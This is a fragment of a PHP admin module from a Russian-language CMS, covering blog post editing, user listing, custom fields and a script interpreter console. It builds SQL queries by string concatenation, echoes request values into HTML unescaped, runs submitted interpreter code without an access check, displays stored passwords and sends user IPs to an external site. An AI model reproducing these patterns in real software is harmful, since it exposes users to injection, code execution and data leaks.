  $head_html='<script type="text/javascript" src="ckeditor/ckeditor.js"></script><script type="text/javascript" src="AjexFileManager/ajex.js"></script><script type="text/javascript" src="AjexFileManager/ajex1.js"></script>';
  $head_html.='<link rel=\'stylesheet\' href=\'calendar/calendar.css\' type=\'text/css\'><script type=\'text/javascript\' src=\'calendar/calendar.js\'></script>';
  //$head_html='<script type="text/javascript" src="tiny_mce/tiny_mce.js"></script><script type="text/javascript" src="tiny_mce/tiny_mce_setings.js"></script>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function BlogPost()
{
  global $head_html, $do_res, $id, $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_blogs']=='rw') {
  $r='';
  foreach($_POST as $key=>$x){if ($key!='cats') {$_POST[$key]=mysql_real_escape_string($x);}}
  if ($_POST['link']=="") // Generate SEO link by title
  {
    include_once("functions.php");
  	$_POST['link']=encodestring($_POST['title']);
  	//$r.=$_POST['title'].'='.$_POST['link'].'<br>';
  }
  $bl=GetBlogRecordByLink($_POST['link']);
  if ($bl['id']==$id||$bl['id']==-1)
  {
  //$r.=print_r($_POST, true).'<hr>';
  $d=$_POST['dt'];
  $dt=substr($d,-4).'-'.substr($d,3,2).'-'.substr($d,0,2);
  $img=$_POST['srcFile_function'];
  $nt=$_POST['note'];
  $a='N';
  if (isset($_POST['b_active'])) {$a='Y';}
  if ($id==-1) {$sq='insert into blog (dt, active, title, body, link, img, note) values ("'.$dt.'","'.$a.'","'.$_POST['title'].'","'.$_POST['body'].'","'.$_POST['link'].'", "'.$img.'", "'.$nt.'")';}
    else {$sq='update blog set dt="'.$dt.'", active="'.$a.'", img="'.$img.'", note="'.$nt.'", title="'.$_POST['title'].'", body="'.$_POST['body'].'", link="'.$_POST['link'].'" where (id='.$id.')';}
  mysql_query ($sq) or die ("Error in BlogPost<br>".mysql_error());
  if ($id==-1) {
     $R = mysql_query ('select LAST_INSERT_ID() as id from blog') or die ("Error in BlogPost<br>".mysql_error());
     $T=mysql_fetch_array($R);
     $id=$T['id'];
  }
  mysql_query ('delete from blog_data where (id_blog='.$id.')') or die ("Error in BlogPost<br>".mysql_error());
  if (isset($_POST['cats'])) {
     foreach($_POST['cats'] as $key=>$x){mysql_query ('insert into blog_data (id_blog, id_cat) value ('.$id.','.$key.')') or die ("Error in BlogPost<br>".mysql_error());}
  }
  $r.=doNotice('<b>Запись сохранена</b>');
  } else {$r.='<font color=red>Ссылка повторяется, запись не сохранена, нажмите "Назад", чтобы исправить</font><br>'; }
  $r.=Blogs();
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function BlogDelete()
{
  global $head_html, $do_res, $id, $user_dat;
 if ($user_dat['acl']>=1000||$user_dat['r_blogs']=='rw') {
  include_once('engine.php');
  $tmpl=GetBlogRecordByID($id);
  $r='<table width="100%" border=0>';
  $r.='<tr><th align="center" colspan="2">Удалить запись:</b></br>'.$tmpl["title"].'</th></tr>';

  $r.='<tr><td width="50%" align="right">';
  $r.='<form action="index.php" method="POST">';
  $r.='<input name="do" type="hidden" value="blog_del">';
  $r.='<input name="id" type="hidden" value="'.$tmpl["id"].'">';
  $r.='<input type="submit" value="Удалить"></form></td>';
  $r.='<td><form action="index.php" method="GET"><input name="do" type="hidden" value="blog"><input type="submit" value="Нет"></form></td></tr></table>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function BlogDel()
{
  global $do_res, $id, $user_dat;
 if ($user_dat['acl']>=1000||$user_dat['r_blogs']=='rw') {
  include_once('engine.php');
  $tmpl=GetBlogRecordByID($id);
  $r=doNotice('Удалено:'.$tmpl["title"]);
  mysql_query ('delete from blog_data where (id_blog='.$id.')') or die ("Error in BlogDel<br>".mysql_error());
  mysql_query ('delete from blog where (id='.$id.')') or die ("Error in BlogDel<br>".mysql_error());
  $r.=Blogs();
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}

function MongolAdm()
{
  include_once("engine.php");
  $src=GetPostGetParam('src');
  if ($src=="") {$src='{mgl $res="Hello world!!!"; mgl}';}  $r='<b>Интерпритатор mongol</b><br>';
  $r.='<form name="mongol" action="index.php" method="get"><input name="do" type="hidden" value="mongol">';
  $r.='<textarea name="src" style="width:99%;height:400px;">'.$src.'</textarea>';
  $r.='<input type="submit" value="Выполнить">';
  $r.='</form>';
  $r.='<hr>'.Mongol($src);
  return $r;
}

function AuthUsersListManager()
{
  $r='<b>Список Пользователей</b>&nbsp; <a href="index.php?do=authuser_edit&id=-1" title="Создать пользователя">+</a></br>';
  $r.='<table>';
  $r.='<tr><th width="90">ID</th><th>UserName</th><th>Mail</th><th>Password</th><th>Last activity</th><th>Last IP</th><th>Info</th></tr>';
  $sql='select id, username,mail, pass, dt, ip from auth_users order by dt desc';
  $R = mysql_query ($sql) or die ("Error in AuthUsersListManager<br>".mysql_error());
  $T=mysql_fetch_array($R);
  while (is_array($T))
  {
    $dt = date("Y-m-d H:i:s", strtotime($T['dt']));
    $dt1 = date("Y-m-d H:i:s", time()-60*60);
    if ($dt>$dt1) {$t='<font color=green>'.$T['username'].' *</font>';} else {$t=$T['username'];}

    $r.='<tr><td>'.$T['id'].'</td><td>'.$t.'</td><td>'.$T['mail'].'</td><td>'.$T['pass'].'</td><td>'.$T['dt'].'</td><td>'.$T['ip'].'</td><td><iframe src="http://dkcomp.kz/ipinfo.php?ip='.$T['ip'].'" width="250" height="32" frameborder="0" scrolling="no">Old browser</iframe></td></tr>';
    $T=mysql_fetch_array($R);
  }
  $r.='</table>';
  return $r;
}

function AuthMakeFieldsListStrs()
{
  $f=array();
  $f['c']='Строка';
  $f['n']='Число';
  $f['f']='Число c точкой';
  $f['sl']='Выборка';
  $f['d']='Дата';
  $f['m']='Текст';
  return $f;
}
function AuthUsersListFields()
{
  $r='<b>Список полей Пользователей</b>&nbsp; <a href="index.php?do=authuser_fieldedit&id=-1" title="Создать поле">+</a></br>';
  $r.='<table>';
  $r.='<tr><th>Поле</th><th>Тип</th></tr>';
  $sql='select id,field,typ from auth_usersfields order by pos';
  $R = mysql_query ($sql) or die ("Error in AuthUsersListFields<br>".mysql_error());
  $T=mysql_fetch_array($R);
  while (is_array($T))
  {
    $f=AuthMakeFieldsListStrs();
    $r.='<tr><td><a href="index.php?do=authuser_fieldedit&id='.$T['id'].'">'.$T['field'].'</td><td>'.$f[$T['typ']].'</td></tr>';
    $T=mysql_fetch_array($R);
  }
  $r.='</table>';
  return $r;
}
function AuthUsersListFieldEditPost()
{  global $id;
   if ($id==-1)
     {
        $v='"'.mysql_real_escape_string($_POST['field']).'",';
        $v.='"'.mysql_real_escape_string($_POST['typ']).'",';
        $v.=mysql_real_escape_string($_POST['pos']).',';
        $v.='"'.mysql_real_escape_string($_POST['obj']).'"';
       	$R = mysql_query ('insert into auth_usersfields (field, typ, pos, obj) values ('.$v.')') or die ("Error in AuthUsersListFieldEdit<br>".mysql_error());
     } else
     {
        $v='field="'.mysql_real_escape_string($_POST['field']).'",';
        $v.='typ="'.mysql_real_escape_string($_POST['typ']).'",';
        $v.='pos='.mysql_real_escape_string($_POST['pos']).',';
        $v.='obj="'.mysql_real_escape_string($_POST['obj']).'"';
        $R = mysql_query ('update auth_usersfields set '.$v.' where (id='.$id.')') or die ("Error in AuthUsersListFieldEdit<br>".mysql_error());
     }
}
function AuthUsersListFieldEdit()
{
  global $do_res, $id, $user_dat;
  if ($id!=-1)
  {     $sql='select id,field,typ,pos, obj from auth_usersfields where (id='.$id.')';
     $R = mysql_query ($sql) or die ("Error in AuthUsersListFieldEdit<br>".mysql_error());
     $T=mysql_fetch_array($R);
  } else
    {     $T=array();
     $T['id']=-1;$T['field']='';$T['typ']='';$T['pos']=100;$T['obj']='';
    }
  $r='<b>Редактируем полльзовательское поле<b><br>';
  $r.='<form name="" action="index.php" method="post"><input name="do" type="hidden" value="authuser_fieldeditpost">';
  $r.='<input name="id" type="hidden" value="'.$T['id'].'">';
  $r.='Поле:<input style="width:190px;" name="field" type="text" value="'.$T['field'].'"> ';
  $r.='Тип:<select style="width:190px;" size="1" name="typ">';
  $f=AuthMakeFieldsListStrs();
  foreach($f as $key=>$x)
  {
    if ($T['typ']==$key) {$sl=' selected';} else {$sl='';}
    $r.='<option value="'.$key.'"'.$sl.'>'.$x.'</option>';
  }
  $r.='</select> Позиция:<input style="width:190px;" name="pos" type="text" value="'.$T['pos'].'"><br>';
  $r.='Доп. инфо:<br><textarea name="obj" rows=5 cols=20 wrap="off">'.$T['obj'].'</textarea>';
  $r.='<input type="submit" value="Сохранить"></form>';




  return $r;
}


?>